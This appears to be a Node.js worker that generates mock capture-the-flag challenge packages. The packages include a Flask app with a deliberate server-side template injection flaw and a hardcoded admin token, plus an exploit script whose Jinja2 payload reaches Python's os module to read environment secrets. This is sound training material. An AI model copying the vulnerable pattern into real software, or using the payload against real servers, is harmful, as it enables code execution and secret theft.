import { Worker } from 'bullmq';
import { getConnection } from '../index.js';
import { getJob, getSpec, updateJobStatus, createChallenge } from '../../db/client.js';

function generateMockChallenge(spec) {
  const category = spec.category || 'web';
  const name = spec.challenge_name || 'Challenge';

  if (category === 'web') {
    return [
      {
        path: 'Dockerfile',
        language: 'dockerfile',
        content: `FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
EXPOSE 5000
CMD ["python", "app.py"]`,
      },
      {
        path: 'requirements.txt',
        language: 'text',
        content: 'flask==3.0.0\ngunicorn==21.2.0',
      },
      {
        path: 'app.py',
        language: 'python',
        content: `#!/usr/bin/env python3
"""${name} - Vulnerable Web Application"""
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
FLAG = os.environ.get("FLAG", "${spec.flags?.[0] || 'Exploit3rs{d3f4ult_fl4g}'}")

@app.route("/")
def index():
    return """<h1>${name}</h1>
    <p>Welcome to the challenge. Find the vulnerability and capture the flag.</p>
    <form action="/search" method="GET">
        <input name="q" placeholder="Search..." />
        <button type="submit">Search</button>
    </form>"""

@app.route("/search")
def search():
    q = request.args.get("q", "")
    # Vulnerable: template injection
    template = f"<h1>Results for: {q}</h1><p>No results found.</p>"
    return render_template_string(template)

@app.route("/admin")
def admin():
    token = request.headers.get("X-Admin-Token", "")
    if token == "s3cr3t-4dm1n-t0k3n":
        return FLAG
    return "Unauthorized", 403

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)`,
      },
      {
        path: 'exploit.py',
        language: 'python',
        content: `#!/usr/bin/env python3
"""Exploit script for ${name}"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"

print(f"[*] Targeting {TARGET}")
print("[*] Step 1: Discovering template injection...")

payload = "{{config}}"
r = requests.get(f"{TARGET}/search", params={"q": payload})
if "SECRET_KEY" in r.text or "Config" in r.text:
    print("[+] Template injection confirmed!")
else:
    print("[-] Template injection not found")
    sys.exit(1)

print("[*] Step 2: Extracting flag via SSTI...")
ssti_payload = "{{request.application.__globals__.__builtins__.__import__('os').environ.get('FLAG')}}"
r = requests.get(f"{TARGET}/search", params={"q": ssti_payload})
print(f"[+] Flag: {r.text}")`,
      },
      {
        path: 'writeup.md',
        language: 'markdown',
        content: `# ${name} - Writeup

## Challenge Description
${spec.narrative || 'Exploit the web application vulnerability.'}

## Difficulty
${spec.difficulty || 'Medium'} (${spec.points || 300} points)

## Solution

### Step 1: Reconnaissance
Navigate to the web application and identify input fields.

### Step 2: Identify Vulnerability
The search endpoint is vulnerable to Server-Side Template Injection (SSTI).

### Step 3: Exploit
Use Jinja2 SSTI payloads to read environment variables.

### Step 4: Capture Flag
The flag is stored in the FLAG environment variable.

## Flag
\`${spec.flags?.[0] || 'Exploit3rs{fl4g_h3r3}'}\`

## Anti-AI Measures
${(spec.anti_ai_measures || []).map((m) => `- ${m}`).join('\n')}
`,
      },
    ];
  }

  // Generic challenge for non-web categories
  return [
    {
      path: 'challenge.py',
      language: 'python',
      content: `#!/usr/bin/env python3
"""${name} - Challenge Setup"""
print("Challenge: ${name}")
print("Category: ${category}")
FLAG = "${spec.flags?.[0] || 'Exploit3rs{g3n3r1c_fl4g}'}"
# Challenge implementation here
`,
    },
    {
      path: 'exploit.py',
      language: 'python',
      content: `#!/usr/bin/env python3
"""Exploit for ${name}"""
print("[*] Running exploit...")
# Exploit steps here
print("[+] Flag captured!")
`,
    },
    {
      path: 'writeup.md',
      language: 'markdown',
      content: `# ${name} - Writeup

## Description
${spec.narrative || 'Complete the challenge to capture the flag.'}

## Solution
1. Analyze the provided files
2. Identify the vulnerability
3. Craft the exploit
4. Capture the flag

## Flag
\`${spec.flags?.[0] || 'Exploit3rs{fl4g}'}\`
`,
    },
  ];
}

let worker = null;

export function startBuilderWorker() {
  worker = new Worker(
    'build-queue',
    async (bullJob) => {
      const { jobId } = bullJob.data;
      console.log(`[Builder] Processing job ${jobId}`);

      const job = getJob(jobId);
      if (!job) {
        console.error(`[Builder] Job ${jobId} not found`);
        return;
      }

      updateJobStatus(jobId, 'building');

      // Simulate build delay
      await new Promise((resolve) => setTimeout(resolve, 5000));

      const specRow = getSpec(jobId);
      const spec = specRow?.spec_json || {};
      const fileManifest = generateMockChallenge(spec);
      const tokenUsage = Math.floor(Math.random() * 3000) + 1500;

      createChallenge({
        jobId,
        fileManifest,
        tokenUsage,
        generationTimeMs: 5000,
      });

      updateJobStatus(jobId, 'pending_build_review');
      console.log(`[Builder] Job ${jobId} build ready for review`);
    },
    {
      connection: getConnection(),
      concurrency: 3,
    }
  );

  worker.on('failed', (bullJob, err) => {
    console.error(`[Builder] Job ${bullJob?.data?.jobId} failed:`, err.message);
    if (bullJob?.data?.jobId) {
      try {
        updateJobStatus(bullJob.data.jobId, 'failed', err.message);
      } catch {}
    }
  });

  console.log('[Builder] Worker started');
  return worker;
}

export function getBuilderWorker() {
  return worker;
}
